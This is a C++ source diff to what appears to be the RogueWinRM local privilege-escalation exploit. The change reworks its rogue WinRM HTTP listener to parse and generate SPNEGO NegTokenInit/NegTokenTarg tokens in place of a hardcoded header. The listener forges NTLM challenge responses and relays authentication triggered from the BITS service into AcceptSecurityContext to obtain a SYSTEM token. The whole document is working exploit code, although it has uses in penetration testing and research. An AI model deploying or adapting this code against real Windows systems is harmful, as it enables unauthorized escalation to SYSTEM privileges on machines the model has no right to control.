@@ -9,6 +9,7 @@
 #include <atlbase.h>
 #include "LocalNegotiator.h"
 #include "base64.h"
+#include "spnegotokenhandler/spnego.h"
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS
@@ -24,7 +25,8 @@ typedef unsigned char byte;
 int RunRogueWinRM(wchar_t* processname, wchar_t* listen_port, wchar_t* processargs, bool debug);
 void hexDump2(char* desc, void* addr, int len);
 int findBase64Negotiate(char* buffer, int buffer_len, byte* outbuffer, int* outbuffer_len);
-int findNTLMBytes(char* bytes, int len);
+bool parseNegToken(unsigned char* token, int tokenSize, unsigned char** parsedToken, unsigned long* parsedTokenLen);
+bool genNegTokenTarg(unsigned char* ntlmssp, int ntlmssp_len, unsigned char** generatedToken, unsigned long* generatedTokenLen);
 int processNtlmBytes(char* bytes, int len, LocalNegotiator* negotiator);
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv);
 int IsTokenSystem(HANDLE tok);
@@ -33,7 +35,6 @@ bool isBitsRunning(void);
 bool triggerBits(void);
 HANDLE startListenerThread(wchar_t* listen_port, LocalNegotiator* negotiator, bool debug);
 void startListener(LPVOID threadParameters);
-
 
 void usage()
 {
@@ -330,9 +331,12 @@ void startListener(LPVOID threadParameters) {
 	closesocket(ListenSocket);
 
 	//variables for handling ntlm authentication over http
-	byte base64_ntlmssp_request[4192];
-	int base64_ntlmssp_request_len = 0;
-	unsigned char* ntlmssp_request;
+	byte base64_spnego_token[4192];
+	int base64spnego_token_len = 0;
+	bool spnegoResult = false;
+	unsigned char* spnego_NegTokenInit_request;
+	size_t spnego_NegTokenInit_request_len = 0;
+	unsigned char* ntlmssp_request = NULL;
 	size_t ntlmssp_request_len = 0;
 	char* ntlmssp_type2;
 	size_t ntlmssp_type2_b64_len = 0;
@@ -340,9 +344,10 @@ void startListener(LPVOID threadParameters) {
 	unsigned long ntlmssp_type2_len = 0;
 	byte base64_ntlmssp_authorization[4192];
 	int base64_ntlmssp_authorization_len;
+	unsigned char* spnego_NegTokenTarg_response;
+	size_t spnego_NegTokenTarg_response_len = 0;
 	unsigned char* ntlmssp_authorization;
 	size_t ntlmssp_authorization_len = 0;
-	byte ntlmssp_type2_response_head_spnego[] = { 0xa1, 0x82, 0x01, 0x0b, 0x30, 0x82, 0x01, 0x07, 0xa0, 0x03, 0x0a, 0x01, 0x01, 0xa1, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa2, 0x81, 0xf1, 0x04, 0x81, 0xee };
 	char* ntlmssp_type2_full;
 	int ntlmssp_type2_full_len;
 	char http_response_type2_head[] = "HTTP/1.1 401 \r\nWWW-Authenticate: Negotiate ";
@@ -357,18 +362,27 @@ void startListener(LPVOID threadParameters) {
 		printf("\nHexdump of received packet:\n");
 		hexDump2(NULL, recvbuf, iResult);
 	}
-	//parsing the base64 of ntlmssp negotiate request
-	findBase64Negotiate(recvbuf, iResult, base64_ntlmssp_request, &base64_ntlmssp_request_len);
-	//decoding the base64 of ntlmssp negotiate request
-	ntlmssp_request = base64_decode((const char*)base64_ntlmssp_request, base64_ntlmssp_request_len, &ntlmssp_request_len);
+	//parsing the base64 of SPNEGO request
+	findBase64Negotiate(recvbuf, iResult, base64_spnego_token, &base64spnego_token_len);
+	//decoding the base64 of SPNEGO NegTokenInit
+	spnego_NegTokenInit_request = base64_decode((const char*)base64_spnego_token, base64spnego_token_len, &spnego_NegTokenInit_request_len);
+	//parsing the ntlmssp from the SPNEGO NegTokenInit token
+	spnegoResult = parseNegToken(spnego_NegTokenInit_request, spnego_NegTokenInit_request_len, &ntlmssp_request, (unsigned long*)&ntlmssp_request_len);
+	if (!spnegoResult) {
+		shutdown(ClientSocket, SD_SEND);
+		WSACleanup();
+		exit(-1);
+	}
 	//calling AcceptSecurityContext() on the challenge request
 	processNtlmBytes((char*)ntlmssp_request, ntlmssp_request_len, negotiator);
 	ntlmssp_type2 = negotiator->returnType2(&ntlmssp_type2_len);
 	//forging ntlmssp challenge response
-	ntlmssp_type2_full_len = sizeof(ntlmssp_type2_response_head_spnego) + ntlmssp_type2_len;
-	ntlmssp_type2_full = (char*)malloc(ntlmssp_type2_full_len);
-	memcpy(ntlmssp_type2_full, ntlmssp_type2_response_head_spnego, sizeof(ntlmssp_type2_response_head_spnego));
-	memcpy((ntlmssp_type2_full + sizeof(ntlmssp_type2_response_head_spnego)), ntlmssp_type2, ntlmssp_type2_len);
+	spnegoResult = genNegTokenTarg((unsigned char *)ntlmssp_type2, ntlmssp_type2_len, (unsigned char **)&ntlmssp_type2_full, (unsigned long*)&ntlmssp_type2_full_len);
+	if (!spnegoResult) {
+		shutdown(ClientSocket, SD_SEND);
+		WSACleanup();
+		exit(-1);
+	}
 	//encoding ntlmssp challenge response
 	ntlmssp_type2_b64 = base64_encode((const unsigned char*)ntlmssp_type2_full, (size_t)ntlmssp_type2_full_len, &ntlmssp_type2_b64_len);
 	//forging http response packet 401 with type 2 ntlm chellenge response
@@ -381,11 +395,9 @@ void startListener(LPVOID threadParameters) {
 		printf("\nHexdump of http_response_type2_packet:\n");
 		hexDump2(NULL, http_response_type2_packet, http_response_type2_packet_len);
 	}
-
 	printf("\nSending the 401 http response with ntlm type 2 challenge\n");
 	iResult = send(ClientSocket, http_response_type2_packet, http_response_type2_packet_len - 2, 0);
 	if (iResult <= 0) SocketError(ClientSocket);
-
 	iResult = recv(ClientSocket, recvbuf, 4096, 0);
 	if (iResult <= 0) SocketError(ClientSocket);
 	printf("\nReceived http packet with ntlm type3 response\n");
@@ -393,12 +405,11 @@ void startListener(LPVOID threadParameters) {
 		printf("\nHexdump of received packet http_request_type3_packet:\n");
 		hexDump2(NULL, recvbuf, iResult);
 	}
-
 	printf("\nUsing ntlm type3 response in AcceptSecurityContext()\n");
 	findBase64Negotiate(recvbuf, iResult, base64_ntlmssp_authorization, &base64_ntlmssp_authorization_len);
-	ntlmssp_authorization = base64_decode((const char*)base64_ntlmssp_authorization, base64_ntlmssp_authorization_len, &ntlmssp_authorization_len);
+	spnego_NegTokenTarg_response = base64_decode((const char*)base64_ntlmssp_authorization, base64_ntlmssp_authorization_len, &spnego_NegTokenTarg_response_len);
+	spnegoResult = parseNegToken(spnego_NegTokenTarg_response, spnego_NegTokenTarg_response_len, &ntlmssp_authorization, (unsigned long*)&ntlmssp_authorization_len);
 	processNtlmBytes((char*)ntlmssp_authorization, ntlmssp_authorization_len, negotiator);
-
 	shutdown(ClientSocket, SD_SEND);
 	WSACleanup();
 }
@@ -485,22 +496,15 @@ int findBase64Negotiate(char* buffer, int buffer_len, byte* outbuffer, int* outb
 }
 
 int processNtlmBytes(char* bytes, int len, LocalNegotiator* negotiator) {
-	int ntlmLoc = findNTLMBytes(bytes, len);
-	if (ntlmLoc == -1) return -1;
-
-	int messageType = bytes[ntlmLoc + 8];
+	int messageType = bytes[8];
 	switch (messageType) {
 	case 1:
 		//NTLM type 1 message
-		negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
+		negotiator->handleType1(bytes, len);
 		break;
-		/*case 2:
-			//NTLM type 2 message
-			negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
-			break;*/
 	case 3:
 		//NTLM type 3 message
-		negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
+		negotiator->handleType3(bytes, len);
 		break;
 	default:
 		printf("Error - Unknown NTLM message type...");
@@ -510,23 +514,66 @@ int processNtlmBytes(char* bytes, int len, LocalNegotiator* negotiator) {
 	return 0;
 }
 
-int findNTLMBytes(char* bytes, int len) {
-	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
-	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
-	//we can just return the index
-	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
-	int pIdx = 0;
-	int i;
-	for (i = 0; i < len; i++) {
-		if (bytes[i] == pattern[pIdx]) {
-			pIdx = pIdx + 1;
-			if (pIdx == 7) return (i - 6);
-		}
-		else {
-			pIdx = 0;
+bool parseNegToken(unsigned char* token, int tokenSize, unsigned char** parsedToken, unsigned long *parsedTokenLen) {
+	SPNEGO_TOKEN_HANDLE     hSpnegoToken = NULL;
+	int						nError = 0L;
+	unsigned char* pbMechToken = NULL;
+
+	if (spnegoInitFromBinary(token, tokenSize, &hSpnegoToken) != SPNEGO_E_SUCCESS){
+		printf("\nCannot parse SPNEGO NegTokenInit token\n");
+		return false;
+	}
+
+	nError = spnegoGetMechToken(hSpnegoToken, NULL, parsedTokenLen);
+	if (SPNEGO_E_BUFFER_TOO_SMALL == nError)
+	{
+
+		// Allocate a properly sized buffer and retry.
+		pbMechToken = (unsigned char*)malloc(*parsedTokenLen);
+
+		if (spnegoGetMechToken(hSpnegoToken, pbMechToken, parsedTokenLen)!= SPNEGO_E_SUCCESS)
+		{
+			printf("\nCannot get MechToken content from SPNEGO NegTokenInit token\n");
+			return false;
 		}
 	}
-	return -1;
+	*parsedToken = pbMechToken;
+	return true;
+}
+
+bool genNegTokenTarg(unsigned char* ntlmssp, int ntlmssp_len, unsigned char** generatedToken, unsigned long* generatedTokenLen) {
+	unsigned char* pbRespToken = NULL;
+	unsigned long     ulRespTokenLen = 0L;
+	int						nError = 0L;
+	SPNEGO_TOKEN_HANDLE     hSpnegoResponseToken = NULL;
+	SPNEGO_MECH_OID   spnegoMechOID = spnego_mech_oid_NTLMSSP;
+	SPNEGO_NEGRESULT  spnegoNegResult = spnego_negresult_incomplete;
+	
+	// Create the Token and then extract the binary.
+	if (spnegoCreateNegTokenTarg(spnegoMechOID, spnegoNegResult, ntlmssp, ntlmssp_len, NULL, 0L, &hSpnegoResponseToken) != SPNEGO_E_SUCCESS)
+	{
+		printf("\nCannot create SPNEGO NegTokenTarg token\n");
+		return false;
+	}
+	if (spnegoTokenGetBinary(hSpnegoResponseToken, NULL, generatedTokenLen)== SPNEGO_E_BUFFER_TOO_SMALL)
+	{
+		// Now allocate and extract the buffer.
+		*generatedToken = (unsigned char*)malloc(*generatedTokenLen);
+		nError = spnegoTokenGetBinary(hSpnegoResponseToken, *generatedToken, generatedTokenLen);
+		if (SPNEGO_E_SUCCESS == nError)
+		{
+			return true;
+		}
+		else
+		{
+			printf("\nCannot convert SPNEGO NegTokenTarg token to binary data\n");
+			free(*generatedToken);
+			*generatedToken = NULL;
+			return false;
+		}
+	}
+	printf("\nCannot convert SPNEGO NegTokenTarg token to binary data\n");
+	return false;
 }
 
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
